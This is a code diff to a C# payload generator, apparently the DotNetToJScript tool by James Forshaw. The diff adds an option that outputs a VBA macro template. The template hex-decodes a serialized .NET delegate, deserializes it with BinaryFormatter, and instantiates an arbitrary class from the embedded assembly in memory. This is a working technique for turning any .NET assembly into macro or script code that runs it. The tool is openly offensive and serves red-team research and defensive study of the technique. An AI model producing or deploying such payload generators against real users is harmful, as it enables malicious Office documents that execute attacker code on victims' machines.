@@ -57,6 +57,48 @@ try {
     WScript.Echo(e.message);
 }";
 
+        static string vba_template =
+            @"
+Private Function decodeHex(hex)
+    On Error Resume Next
+    Dim DM, EL
+    Set DM = CreateObject(""Microsoft.XMLDOM"")
+    Set EL = DM.createElement(""tmp"")
+    EL.DataType = ""bin.hex""
+    EL.Text = hex
+    decodeHex = EL.NodeTypedValue
+End Function
+
+Function Run()
+    Dim serialized_obj
+    %SERIALIZED%
+
+    entry_class = ""%CLASS%""
+
+    Dim stm As Object, fmt As Object, al As Object
+    Set stm = CreateObject(""System.IO.MemoryStream"")
+    Set fmt = CreateObject(""System.Runtime.Serialization.Formatters.Binary.BinaryFormatter"")
+    Set al = CreateObject(""System.Collections.ArrayList"")
+
+    Dim dec
+    dec = decodeHex(serialized_obj)
+
+    For Each i In dec
+        stm.WriteByte i
+    Next i
+
+    stm.Position = 0
+
+    Dim n As Object, d As Object, o As Object
+    Set n = fmt.SurrogateSelector
+    Set d = fmt.Deserialize_2(stm)
+    al.Add n
+
+    Set o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class)
+    %ADDEDSCRIPT%
+End Function
+";
+
         static string scriptlet_template =
             @"<?xml version='1.0'?>
 <package>
@@ -179,6 +221,7 @@ try {
                 bool mscorlib_only = false;
                 bool scriptlet_moniker = false;
                 bool scriptlet_uninstall = false;
+                bool vba_code = false;
 
                 bool show_help = false;
 
@@ -186,6 +229,7 @@ try {
                         { "n", "Build a script which only uses mscorlib.", v => mscorlib_only = v != null },
                         { "m", "Build a scriptlet file in moniker format.", v => scriptlet_moniker = v != null },
                         { "u", "Build a scriptlet file in uninstall format.", v => scriptlet_uninstall = v != null },
+                        { "v", "Build a VBA file.", v => vba_code = v != null },
                         { "o=", "Specify output file (default is stdout).", v => output_file = v },
                         { "c=", String.Format("Specify entry class name (default {0})", entry_class_name), v => entry_class_name = v },
                         { "s=", "Specify file with additional script. 'o' is created instance.", v => script_file = v },
@@ -199,6 +243,12 @@ try {
                     Console.Error.WriteLine("Copyright (C) James Forshaw 2017. Licensed under GPLv3.");
                     Console.Error.WriteLine("Options");
                     opts.WriteOptionDescriptions(Console.Error);
+                    Environment.Exit(1);
+                }
+
+                if (vba_code && (scriptlet_moniker || scriptlet_uninstall))
+                {
+                    WriteError("Cannot use '-v' in combination with scriptlet options.");
                     Environment.Exit(1);
                 }
 
@@ -235,25 +285,55 @@ try {
                 fmt.Serialize(stm, mscorlib_only ? BuildLoaderDelegateMscorlib(assembly) : BuildLoaderDelegate(assembly));
 
                 byte[] ba = stm.ToArray();
+                string template;
                 StringBuilder builder = new StringBuilder();
-                for (int i = 0; i < ba.Length; ++i)
+
+                if (vba_code)
                 {
-                    builder.Append(ba[i]);
-                    if (i < ba.Length - 1)
+                    template = vba_template;
+
+                    string hex_encoded = BitConverter.ToString(ba).Replace("-", "");
+
+                    for (int i = 0; i < hex_encoded.Length; i++)
                     {
-                        builder.Append(",");
+                        if (i == 0)
+                        {
+                            builder.Append("    serialized_obj = \"");
+                        }
+                        else if (i % 100 == 0)
+                        {
+                            builder.Append("\"");
+                            builder.AppendLine();
+                            builder.Append("    serialized_obj = serialized_obj & \"");
+                        }
+                        builder.Append(hex_encoded[i]);
                     }
-                    if (i > 0 && (i % 32) == 0)
+                    builder.Append("\"");
+
+                } else {
+                    template = jscript_template;
+
+                    for (int i = 0; i < ba.Length; ++i)
                     {
-                        builder.AppendLine();
+                        builder.Append(ba[i]);
+                        if (i < ba.Length - 1)
+                        {
+                            builder.Append(",");
+                        }
+                        if (i > 0 && (i % 32) == 0)
+                        {
+                            builder.AppendLine();
+                        }
                     }
                 }
 
-                string script = jscript_template.Replace("%SERIALIZED%", builder.ToString()).Replace("%CLASS%", entry_class_name).Replace("%ADDEDSCRIPT%", File.Exists(script_file) ? File.ReadAllText(script_file) : "");
+                string script = template.Replace("%SERIALIZED%", builder.ToString()).Replace("%CLASS%", entry_class_name).Replace("%ADDEDSCRIPT%", File.Exists(script_file) ? File.ReadAllText(script_file) : "");
+
                 if (scriptlet_moniker || scriptlet_uninstall)
                 {
                     script = CreateScriptlet(script, scriptlet_uninstall);
                 }
+
                 if (!String.IsNullOrEmpty(output_file))
                 {
                     File.WriteAllText(output_file, script, new UTF8Encoding(false));
